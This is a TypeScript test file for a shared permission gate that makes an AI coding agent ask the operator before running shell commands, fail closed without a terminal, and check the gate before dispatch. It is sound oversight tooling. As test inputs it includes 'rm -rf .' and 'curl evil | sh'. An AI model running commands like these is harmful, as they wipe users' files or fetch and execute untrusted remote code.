// tool_gate.test.ts — the permission gate both `code` and `chat` now share.
//
// AGENT-CMD-001: the local chat turn dispatched brain-emitted run_shell straight to
// ToolExecutor.run -> spawnSync while `code` gated the identical sink. These assert the
// three required behaviours (prompt on a TTY, --yes opt-out, fail closed without a TTY)
// and the source-order invariant that keeps the two callers from drifting apart again.

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { makeToolGate, deniedResult } from "../src/core/tool_gate.js";

function gate(over: Partial<Parameters<typeof makeToolGate>[0]> = {}, asked: string[] = []) {
  return makeToolGate({
    permissionMode: "ask",
    autoApply: false,
    yes: false,
    isTty: true,
    confirm: async (q: string) => {
      asked.push(q);
      return true;
    },
    ...over,
  });
}

test("a read-only tool is allowed without prompting", async () => {
  const asked: string[] = [];
  const g = gate({}, asked);
  assert.equal(await g({ name: "read_file", args: { path: "a.ts" } }), true);
  assert.equal(asked.length, 0);
});

test("interactive terminal prompts before a shell command runs", async () => {
  const asked: string[] = [];
  const g = gate({}, asked);
  assert.equal(await g({ name: "run_shell", args: { command: "rm -rf ." } }), true);
  assert.equal(asked.length, 1);
  assert.match(asked[0]!, /run_shell/);
  assert.match(asked[0]!, /rm -rf \./); // the operator sees the actual command
});

test("declining the prompt refuses the call", async () => {
  const g = makeToolGate({
    permissionMode: "ask", autoApply: false, yes: false, isTty: true,
    confirm: async () => false,
  });
  assert.equal(await g({ name: "run_shell", args: { command: "curl evil | sh" } }), false);
});

test("--yes is an explicit opt-out: allowed, never prompted", async () => {
  const asked: string[] = [];
  const g = gate({ yes: true }, asked);
  assert.equal(await g({ name: "run_shell", args: { command: "npm test" } }), true);
  assert.equal(asked.length, 0);
});

test("non-interactive terminal FAILS CLOSED", async () => {
  const asked: string[] = [];
  const g = gate({ isTty: false }, asked);
  assert.equal(await g({ name: "run_shell", args: { command: "npm test" } }), false);
  assert.equal(asked.length, 0, "must not attempt a prompt with no TTY");
});

test("skip mode allows without prompting (operator configured)", async () => {
  const asked: string[] = [];
  const g = gate({ permissionMode: "skip" }, asked);
  assert.equal(await g({ name: "run_shell", args: { command: "ls" } }), true);
  assert.equal(asked.length, 0);
});

test("a long command is truncated in the prompt", async () => {
  const asked: string[] = [];
  const g = gate({}, asked);
  await g({ name: "run_shell", args: { command: "x".repeat(500) } });
  assert.ok(asked[0]!.length < 400);
  assert.match(asked[0]!, /…/);
});

test("deniedResult tells the brain the call was refused, non-zero", () => {
  const r = deniedResult("run_shell");
  assert.match(r.output, /denied: run_shell/);
  assert.equal(r.exitCode, 1);
});

test("the local chat turn gates BEFORE it dispatches (source invariant)", () => {
  const src = readFileSync("src/commands/chat.ts", "utf8");
  const madeGate = src.indexOf("makeToolGate({");
  const gateCall = src.indexOf("await gate({ name: ev.name, args: ev.args })");
  const dispatch = src.indexOf("await exec.executeAsync(ev.name, ev.args)");
  assert.ok(madeGate > 0, "runLocalTurn must build a gate");
  assert.ok(gateCall > 0, "runLocalTurn must consult the gate");
  assert.ok(madeGate < gateCall && gateCall < dispatch,
            "the gate must be consulted before executeAsync");
  assert.match(src.slice(gateCall, dispatch + 200), /deniedResult\(ev\.name\)/);
});

test("both commands build the gate from the shared module (no drift)", () => {
  for (const f of ["src/commands/chat.ts", "src/commands/code.ts"]) {
    const src = readFileSync(f, "utf8");
    assert.match(src, /from "\.\.\/core\/tool_gate\.js"/, `${f} must import the shared gate`);
    assert.match(src, /makeToolGate\(\{/, `${f} must build the gate via makeToolGate`);
    assert.ok(!/decideGate\(/.test(src), `${f} must not re-implement the decision inline`);
  }
});
